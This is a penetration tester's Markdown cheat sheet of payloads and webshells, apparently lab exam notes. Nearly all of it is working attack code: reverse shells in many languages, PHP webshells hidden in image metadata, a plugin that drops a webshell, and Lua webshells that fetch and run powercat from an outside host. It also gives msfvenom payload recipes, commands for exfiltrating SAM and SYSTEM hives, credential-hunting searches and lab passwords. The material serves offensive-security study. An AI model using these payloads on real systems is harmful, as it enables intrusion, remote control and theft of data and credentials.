# Payloads and Webshells

Payload helpers, reverse shells, msfvenom snippets, web shells, encoding helpers, and small exploit-dev payload fragments.
This content was moved here from the original `11-RE-and-xpDev` folder as requested.

## PHP7.2

```
/usr/bin/php7.2 -r "pcntl_exec('/bin/bash', ['-p']);"
```

## Exiftool

```
exiftool -Comment='<?php passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f"); ?>' shell.jpg
exiv2 -c'A "<?php system($_REQUEST['cmd']);?>"!' <FILE>.jpeg
exiftool "-comment<=back.php" back.png
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' <FILE>.png
```

## Reverse Shells

```
bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
echo -n '/bin/bash -c "bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"' | base64
```
```
String host="<LHOST>";
int port=<LPORT>;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<LHOST>/<LPORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<LHOST>/<LPORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor();
```

## shell.jar

```
package <NAME>;

import org.bukkit.plugin.java.JavaPlugin;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;

public class Main extends JavaPlugin {
   @Override
   public void onDisable() {
     super.onDisable();
   }

@Override
public void onEnable() {
  final String PHP_CODE = "<?php system($_GET['cmd']); ?>";
  try {
   Files.write(Paths.get("/var/www/<RHOST>/shell.php"), PHP_CODE.getBytes(), StandardOpenOption.CREATE_NEW);
   } catch (IOException e) {
     e.printStackTrace();
   }

   super.onEnable();
  }
}
```
```
http://<RHOST>');os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT>/tmp/f")--
```
```
--';bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1;'--
```
```
mkfifo /tmp/shell; nc <LHOST> <LPORT> 0</tmp/shell | /bin/sh >/tmp/shell 2>&1; rm /tmp/shell
```
```
nc -e /bin/sh <LHOST> <LPORT>
```
```
perl -e 'use Socket;$i="<LHOST>";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
```
php -r '$sock=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
```
```
$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
```
powershell -nop -exec bypass -c '$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
```

## minireverse.ps1

```
$socket = new-object System.Net.Sockets.TcpClient('127.0.0.1', 413);
if($socket -eq $null){exit 1}
$stream = $socket.GetStream();
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 1024;
$encoding = new-object System.Text.AsciiEncoding;
do
{
    $writer.Flush();
    $read = $null;
    $res = ""
    while($stream.DataAvailable -or $read -eq $null) {
        $read = $stream.Read($buffer, 0, 1024)
    }
    $out = $encoding.GetString($buffer, 0, $read).Replace("\`r\`n","").Replace("\`n","");
    if(!$out.equals("exit")){
        $args = "";
        if($out.IndexOf(' ') -gt -1){
            $args = $out.substring($out.IndexOf(' ')+1);
            $out = $out.substring(0,$out.IndexOf(' '));
            if($args.split(' ').length -gt 1){
                $pinfo = New-Object System.Diagnostics.ProcessStartInfo
                $pinfo.FileName = "cmd.exe"
                $pinfo.RedirectStandardError = $true
                $pinfo.RedirectStandardOutput = $true
                $pinfo.UseShellExecute = $false
                $pinfo.Arguments = "/c $out $args"
                $p = New-Object System.Diagnostics.Process
                $p.StartInfo = $pinfo
                $p.Start() | Out-Null
                $p.WaitForExit()
                $stdout = $p.StandardOutput.ReadToEnd()
                $stderr = $p.StandardError.ReadToEnd()
                if ($p.ExitCode -ne 0) {
                    $res = $stderr
                } else {
                    $res = $stdout
                }
            }
            else{
                $res = (&"$out" "$args") | out-string;
            }
        }
        else{
            $res = (&"$out") | out-string;
        }
        if($res -ne $null){
        $writer.WriteLine($res)
    }
    }
}While (!$out.equals("exit"))
$writer.close();
$socket.close();
$stream.Dispose()
```
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
```
python -c 'import pty,subprocess,os,time;(master,slave)=pty.openpty();p=subprocess.Popen(["/bin/su","-c","id","bynarr"],stdin=slave,stdout=slave,stderr=slave);os.read(master,1024);os.write(master,"fruity\n");time.sleep(0.1);print os.read(master,1024);'
```
```
echo python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > <FILE><(),2);p=subprocess.call(["/bin/sh","-i"]);' > <FILE>
```
```
ruby -rsocket -e'f=TCPSocket.open("<LHOST>",<LPORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## Catching Reverse Shells

```bash
nc -lnvp <port>
```

## URL Encoding Payloads (cURL)

```bash
curl [http://192.168.223.11/project/uploads/users/412811-backdoor.php](http://192.168.223.11/project/uploads/users/412811-backdoor.php) --data-urlencode "cmd=which nc"
```

## Compile csharp dll x64 (Mono)

```
mcs -platform:x64 -target:library <source.cs>
```

## Compile csharp dll x64 (Windows)

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library <source.cs>
```

## Compile csharp exe x64 (Windows)

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe <source.cs>
```

## Compile csharp dll x86 (Windows)

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library <source.cs>
```

## Compile csharp exe x86 (Windows)

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe <source.cs>
```

## migrate

```
run post/windows/manage/priv_migrate NAME=notepad.exe ANAME=svchost.exe
```

## Check PPL

```
reg queryval -k "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" -v RunAsPPL
```

## Windows 64bit shell reverse tcp

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```

## Linux 64bit shell reverse tcp

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```

## ASP reverse_tcp

```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
```

## lsp webshells - LUA Server Pages webshell for Windows

https://github.com/the-emmons/lsp-reverse-shell?source=post_page-----09adfeceaa74---------------------------------------

```lsp
<div style="margin-left:auto;margin-right: auto;width: 350px;">

<div id="info">
<h2>Lua Server Pages Reverse Shell</h2>
<p>Delightful, isn't it?</p>
</div>

# May want to base64 encode payload (IEX...) "powershell -enc HJKASFD832...."

<?lsp if request:method() == "GET" then ?>
   <?lsp os.execute("IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.165/powercat.ps1');powercat -c 192.168.45.165 -p 45332 -e powershell") ?>
<?lsp else ?>
   You sent a <?lsp=request:method()?> request
<?lsp end ?>

</div>

----------------- OR -----------------

<div style="margin-left:auto;margin-right: auto;width: 350px;">

<div id="info">
<h2>Lua Server Pages Reverse Shell</h2>
<p>Delightful, isn't it?</p>
</div>

<?lsp if request:method() == "GET" then ?>
   <?lsp os.execute("cmd.exe /c net use x: \\\\192.168.1.1\\SMB /user:user pass & x:\\ncat.exe 192.168.1.1 135 -e cmd.exe") ?>
<?lsp else ?>
   You sent a <?lsp=request:method()?> request
<?lsp end ?>

</div>
```

---

## MSFVENOM

```
msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f hta-psh -o shell.doc
```

## MSFVENOM Cheatsheet

```
https://github.com/frizb/MSF-Venom-Cheatsheet

msfvenom -p linux/x64/shell_reverse_tcp LHOST=$IP LPORT=443 -f elf > shell.php

msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=<port you designated> -f exe -o ~/shell.exe

msfvenom -p java/jsp_shell_reverse_tcp LHOST=$IP LPORT=80 -f raw > shell.jsp

msfvenom -f aspx -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=443 -o shell64.aspx

msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.179 LPORT=8080 -f war > shell.war
```

## Javascript shellcode

```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.179 LPORT=443 -f js_le -o shellcode

(new-object System.Net.WebClient).DownloadFile('http://192.168.119.138:800/chisel.exe','C:\Windows\Tasks\chisel.exe')

impacket-smbserver -smb2support Share .
cmd.exe /c //<your kali IP>/Share/<file name you want>

/usr/local/bin/smbserver.py -username df -password df share . -smb2support
net use \\<your kali IP>\share /u:df df
copy \\<your kali IP>\share\<file wanted>

impacket-smbserver -smb2support Share .
net use \\<your kali IP>\share
copy \\<your kali IP>\share\whoami.exe

python3 -m http.server 80
certutil -urlcache -split -f http://<your kali IP>/shell.exe C:\\Windows\temp\shell.exe

Invoke-WebRequest -Uri http://10.10.93.141:7781/winPEASx64.exe -OutFile wp.exe
```

## Errors

```
Access is denied. In this case try Invoke-WebRequest for powershell

In this situation we have logged onto computer A
sudo impacket-psexec Admin:'password123'@192.168.203.141 cmd.exe
C:\Windows\system32> ipconfig

Windows IP Configuration

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 192.168.203.141
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.203.254

Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 10.10.93.141
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :

 Via Computer A we pivot to Computer B (internal IP) with these creds
 proxychains evil-winrm -u celia.almeda -p 7k8XHk3dMtmpnC7 -i 10.10.93.142

*Evil-WinRM* PS C:\windows.old\Windows\system32> net use * \\10.10.93.141\C$ /user:Admin password123

*Evil-WinRM* PS C:\windows.old\Windows\system32> xcopy C:\windows.old\Windows\system32\SYSTEM Z:\
*Evil-WinRM* PS C:\windows.old\Windows\system32> xcopy C:\windows.old\Windows\system32\SAM Z:\

impacket-smbserver -smb2support Share .
smbserver.py -smb2support Share .
mkdir loot #transfering loot to this folder
net use * \\192.168.119.183\share
copy Z:\<file you want from kali>
copy C:\bank-account.zip Z:\loot #Transfer files to the loot folder on your kali machine
```

## Authenticated

```
You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.

impacket-smbserver -username df -password df share . -smb2support
net use \\10.10.16.9\share /u:df df
copy \\10.10.16.9\share\<file wanted>

cat upload.php
chmod +x upload.php

<?php
$uploaddir = '/var/www/uploads/';

$uploadfile = $uploaddir . $_FILES['file']['name'];

move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>

sudo mkdir /var/www/uploads

mv upload.php /var/www/uploads

service apache2 start
ps -ef | grep apache

powershell (New-Object System.Net.WebClient).UploadFile('http://<your Kali ip>/upload.php', '<file you want to transfer>')

service apache2 stop

https://sirensecurity.io/blog/linux-privilege-escalation-resources/

/opt #lead us to chloe which lead us to root

find / -type d -writable -user $(whoami) 2>/dev/null

find / -perm -4000 -user root -exec ls -ld {} \; 2> /dev/null
find / -perm /4000 2>/dev/null
```

## start-stop-daemon

```
/usr/sbin/start-stop-daemon

/usr/sbin/start-stop-daemon -n foo -S -x /bin/sh -- -p
```

## PowerUp.ps1

```
cp /opt/PowerUp/PowerUp.ps1 .
Import-Module .\PowerUp.ps1
. .\PowerUp.ps1
```

## Windows Binaries

```
sudo apt install windows-binaries

# Basics
systeminfo
hostname

# Who am I?
whoami
echo %username%

# What users/localgroups are on the machine?
net users
net localgroups

# More info about a specific user. Check if user has privileges.
net user user1

# View Domain Groups
net group /domain

# View Members of Domain Group
net group /domain <Group Name>

# Firewall
netsh firewall show state
netsh firewall show config

# Network
ipconfig /all
route print
arp -A

# How well patched is the system?
wmic qfe get Caption,Description,HotFixID,InstalledOn

dir /a-r-d /s /b
move "C:\Inetpub\wwwroot\winPEASx86.exe" "C:\Directory\thatisWritable\winPEASx86.exe"

accesschk.exe /accepteula -uwcqv "Authenticated Users" * #command refer to exploits below

findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

#Find all those strings in config files.
dir /s *pass* == *cred* == *vnc* == *.config*

# Find all passwords in all files.
findstr /spin "password" *.*
findstr /spin "password" *.*

dir /s /p proof.txt
dir /s /p local.txt
```

## Git commands

```
C:\Users\damon> type .gitconfig
[safe]
        directory = C:/prod
[user]
        email = damian
        name = damian

C:\Users\damon> cd C:/prod

C:\prod> git log
fatal: detected dubious ownership in repository at 'C:/prod'
'C:/prod/.git' is owned by:
        'S-1-5-21-464543310-226837244-3834982083-1003'
but the current user is:
        'S-1-5-18'
To add an exception for this directory, call:

        git config --global --add safe.directory C:/prod

C:\prod> git config --global --add safe.directory C:/prod

C:\prod> git log
commit 8b430c17c16e6c0515e49c4eafdd129f719fde74
Author: damian <damian>
Date:   Thu Oct 20 02:07:42 2022 -0700

    Email config not required anymore

commit 967fa71c359fffcbeb7e2b72b27a321612e3ad11
Author: damian <damian>
Date:   Thu Oct 20 02:06:37 2022 -0700

    V1

C:\prod> git show
commit 8b430c17c16e6c0515e49c4eafdd129f719fde74
Author: damian <damian>
Date:   Thu Oct 20 02:07:42 2022 -0700

    Email config not required anymore

diff --git a/htdocs/cms/data/email.conf.bak b/htdocs/cms/data/email.conf.bak
deleted file mode 100644
index 77e370c..0000000
--- a/htdocs/cms/data/email.conf.bak
+++ /dev/null
@@ -1,5 +0,0 @@
-Email configuration of the CMS
-maildmz@example.com:DPuBT9tGCBrTbR
-
-If something breaks contact jim@example.com as he is responsible for the mail server.
-Please don't send any office or executable attachments as they get filtered out for security reasons.
\ No newline at end of file

PS C:\> (Get-PSReadlineOption).HistorySavePath
C:\Users\USERA\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

type C:\Users\USERA\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
echo "Let's check if this script works running as damon and password i6yuT6tym@"
echo "Don't forget to clear history once done to remove the password!"
Enter-PSSession -ComputerName LEGACY -Credential $credshutdown /s
```

## Interesting Files

```
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
type C:\xampp\passwords.txt

Get-ChildItem -Path C:\Users\USERD\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
cat Desktop\asdf.txt
```

## Reverse shells

```
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

bash -i >& /dev/tcp/10.0.0.1/4242 0>&1 #worked
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your $IP",22));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' #worked
```

---

## exploit fix

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.203 LPORT=443 EXITFUNC=thread -f py –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d" --var-name shellcode
```
```
msfvenom -p windows/shell_reverse_tcp LHOST=<Your IP> LPORT=443  EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python
```

## exe/dll

```
msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.1.3 lport=443 -f exe > shell.exe
```
```
msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.1.3 lport=443 -f dll > shell.dll
```

## elf

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.168 LPORT=443 -f elf -o sh
```

## php

```
msfvenom -p php/reverse_php -f raw lhost=192.168.45.210 lport=443 > pwn.php
```
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.119.5 LPORT=443 -f exe -o met.exe
```
```
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $(echo $IP); set LPORT 443; set ExitOnSession false; run -j"
```
